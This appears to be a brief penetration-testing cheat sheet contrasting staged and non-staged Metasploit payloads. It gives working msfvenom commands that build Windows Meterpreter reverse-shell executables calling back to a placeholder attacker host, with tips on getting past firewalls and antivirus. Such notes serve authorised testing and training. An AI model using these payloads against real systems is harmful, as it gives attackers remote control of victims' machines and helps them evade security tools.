   

Staged vs Non-Staged Payloads

# **Staged vs Non-Staged Payloads**

## **1. Understanding Staged and Non-Staged Payloads**

|Type|How It Works|When to Use|
|---|---|---|
|**Staged Payload**|Sends an initial small payload (stager) that downloads and executes the full payload.|Useful for large payloads or when bypassing size restrictions.|
|**Non-Staged Payload**|The full payload is sent in one go, without requiring further network communication.|Useful when stability is needed or the network might block multiple connections.|

---

## **2. Staged Payloads (`/payload/reverse_tcp`)**

- Used when memory constraints exist or when trying to evade detection.
    
- The **stager** connects to the attacker's machine, downloads the full shell, and executes it.
    
- **Example (Metasploit Reverse Shell Staged):**
    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > shell.exe
    
    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > shell.exe
    ```
    
- If the connection is unstable, **try a non-staged payload**.
    

---

## **3. Non-Staged Payloads (`/payload/reverse_tcp_inline`)**

- The entire payload is delivered at once, meaning no second-stage download is needed.
    
- More reliable in **unstable networks** or **when staged payloads fail**.
    
- **Example (Metasploit Reverse Shell Non-Staged):**
    
    msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > shell.exe
    
    ```
    msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > shell.exe
    ```
    
- If this fails due to size limitations, **try a staged payload**.
    

---

## **4. When to Switch Payloads**

- If a **staged payload doesn't work**, the second-stage delivery might be **blocked by a firewall** → Try **non-staged**.
- If a **non-staged payload is too large**, making it hard to inject → Try **staged**.
- If the network is **unstable**, a **non-staged** payload is **less likely to break**.
- Some **antivirus and endpoint security** solutions detect staged payloads easier → **Try non-staged**.